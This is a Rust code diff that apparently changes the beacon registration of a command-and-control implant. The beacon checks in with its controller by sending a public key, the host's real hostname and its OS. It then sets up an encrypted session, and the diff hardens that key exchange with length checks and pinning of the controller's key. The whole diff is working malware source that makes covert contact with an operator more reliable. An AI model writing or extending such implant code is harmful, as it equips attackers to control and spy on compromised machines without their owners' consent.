@@ -77,7 +77,9 @@ impl Beacon {
         let register_msg = serde_json::json!({
             "op": "register",
             "pubkey": hex::encode(keys.public.as_bytes()),
-            "hostname": "implant",
+            "hostname": hostname::get()
+                .unwrap_or_else(|_| "unknown".into())
+                .to_string_lossy(),
             "os": std::env::consts::OS,
         });
 
@@ -86,24 +88,41 @@ impl Beacon {
         let response: serde_json::Value =
             serde_json::from_slice(&result.data).unwrap_or_default();
 
-        if let Some(server_pubkey_hex) = response.get("pubkey").and_then(|v| v.as_str()) {
-            let server_pubkey_bytes = hex::decode(server_pubkey_hex)?;
-            let mut server_pubkey_arr = [0u8; 32];
-            server_pubkey_arr.copy_from_slice(&server_pubkey_bytes);
-            let server_pub = x25519_dalek::PublicKey::from(server_pubkey_arr);
+        let server_pubkey_hex = response
+            .get("pubkey")
+            .and_then(|v| v.as_str())
+            .ok_or("server did not provide public key")?;
 
-            let shared = crypto::compute_shared(&keys.secret, &server_pub);
-            let session_id = response
-                .get("session_id")
-                .and_then(|v| v.as_str())
-                .unwrap_or("0000000000000000")
-                .as_bytes();
-            let session_key = crypto::derive_session_key(&shared, session_id, b"dagger-session-v1");
-
-            let mut sk = self.session_key.lock().await;
-            *sk = Some(session_key);
-            log::info!("session established");
+        let server_pubkey_bytes = hex::decode(server_pubkey_hex)
+            .map_err(|e| format!("invalid server public key hex: {e}"))?;
+        if server_pubkey_bytes.len() != KEY_SIZE {
+            return Err(format!(
+                "invalid server public key length: {} (expected {})",
+                server_pubkey_bytes.len(), KEY_SIZE
+            ).into());
         }
+        let mut server_pubkey_arr = [0u8; KEY_SIZE];
+        server_pubkey_arr.copy_from_slice(&server_pubkey_bytes);
+
+        // Verify server public key matches configured key (prevents MITM)
+        if self.config.server_pubkey != [0u8; KEY_SIZE]
+            && server_pubkey_arr != self.config.server_pubkey
+        {
+            return Err("server public key mismatch — possible MITM".into());
+        }
+
+        let server_pub = x25519_dalek::PublicKey::from(server_pubkey_arr);
+        let shared = crypto::compute_shared(&keys.secret, &server_pub);
+        let session_id = response
+            .get("session_id")
+            .and_then(|v| v.as_str())
+            .unwrap_or("0000000000000000")
+            .as_bytes();
+        let session_key = crypto::derive_session_key(&shared, session_id, b"dagger-session-v1");
+
+        let mut sk = self.session_key.lock().await;
+        *sk = Some(session_key);
+        log::info!("session established");
 
         Ok(())
     }
